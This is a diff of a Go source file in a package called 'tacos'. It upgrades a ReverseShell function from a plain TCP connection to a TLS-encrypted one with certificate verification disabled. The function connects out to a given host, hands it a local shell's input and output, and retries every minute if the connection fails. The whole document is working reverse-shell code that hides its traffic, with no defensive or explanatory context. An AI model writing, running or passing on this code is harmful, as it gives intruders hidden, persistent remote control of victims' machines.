@@ -4,8 +4,8 @@
 package tacos
 
 import (
+	"crypto/tls"
 	"fmt"
-	"net"
 	"os/exec"
 	"time"
 )
@@ -18,19 +18,22 @@ func DetectDefaultShell() string {
 
 //ReverseShell: spawn a reverse shell with pty targeting host (ip:port)
 func ReverseShell(host string, shell string) {
-	c, err := net.Dial("tcp", host)
+	conf := &tls.Config{
+		InsecureSkipVerify: true,
+	}
+	conn, err := tls.Dial("tcp", host, conf)
 	if nil != err {
 		fmt.Println(err)
-		if nil != c {
-			c.Close()
+		if nil != conn {
+			conn.Close()
 		}
 		time.Sleep(time.Minute)
 		ReverseShell(host, shell)
 	}
 
 	cmd := exec.Command(shell)
-	cmd.Stdin = c
-	cmd.Stdout = c
-	cmd.Stderr = c
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
 	cmd.Run()
 }
